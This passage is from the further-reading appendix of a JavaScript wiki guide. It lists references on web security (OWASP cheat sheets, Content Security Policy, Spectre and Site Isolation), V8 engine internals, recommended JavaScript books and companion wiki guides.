  reading its source is the fastest way to understand the transaction
  lifecycle edge cases the raw callback API hides.
- **OWASP Cheat Sheet Series** (`cheatsheetseries.owasp.org`) — specifically
  the *Cryptographic Storage*, *XSS Prevention*, and *Content Security
  Policy* cheat sheets, the authoritative source behind §47 and §51's
  security guidance.
- [`wiki/security/real-life-guide.md`](../security/real-life-guide.html) —
  this wiki's security guide goes much deeper on the cryptographic
  primitives themselves (key sizes, algorithm selection trade-offs, PKI)
  that §46 only introduces at the API-usage level.

### E.6 — Engine internals and browser security (Part VIII)

- **V8 blog** (`v8.dev/blog`) — primary-source posts from the V8 team on
  Ignition, Sparkplug, TurboFan, and hidden-class/inline-cache mechanics
  (§49), written by the engineers who implemented them.
- **"A tour of V8"** series by Vyacheslav Egorov (`mrale.ph`) — an
  independent, unusually detailed technical dive into V8's object
  representation and garbage collector, referenced widely in the JS-engine
  community.
- **"Ignition: Jump-starting an interpreter"** (V8 blog) — the specific
  design-rationale post for why V8 added a bytecode interpreter tier at all,
  directly extending §49's pipeline diagram.
- **Spectre attack** reference site and original paper (`spectreattack.com`)
  — the primary source for §51's speculative-execution side-channel
  discussion, including the original PoC code.
- **Chromium Site Isolation design docs** (`chromium.org` → Chromium
  Security → Site Isolation) — the concrete engineering response to
  Spectre described at a high level in §18/§51.
- **web.dev's Content Security Policy guide** — practical CSP-authoring
  guidance (directive-by-directive) extending §51's policy example.

### Books worth owning

- *You Don't Know JS (Yet)* — Kyle Simpson (free online, also in print).
- *Eloquent JavaScript* — Marijn Haverbeke (free online, also in print).
- *JavaScript: The Definitive Guide* — David Flanagan (O'Reilly) — the
  closest thing to a comprehensive paper reference for the whole language.
- *High Performance Browser Networking* — Ilya Grigorik (free online,
  O'Reilly in print) — Part IV's networking material, in full depth.
- *Secrets of the JavaScript Ninja* — John Resig & Bear Bibeault — closures,
  `this`, and DOM/event internals with the same "how does this actually
  work" angle as Part I-III of this guide.

### This wiki's companion guides

- [`wiki/networking/tcp-ip/real-life-example.md`](../networking/tcp-ip/real-life-example.html)
  — the networking companion for the TCP/TLS/DNS layer underneath every
  `fetch()` call in Part IV.
- [`wiki/scale-perf/real-life-scale-guide.md`](../scale-perf/real-life-scale-guide.html)
  — load-testing, latency percentiles, and traffic simulation for the APIs
  and endpoints built with the patterns in Part IV.
- [`wiki/security/real-life-guide.md`](../security/real-life-guide.html) —
  goes deeper on the cryptography, CSP, and attack/defense material only
  introduced here in Parts VII-VIII.
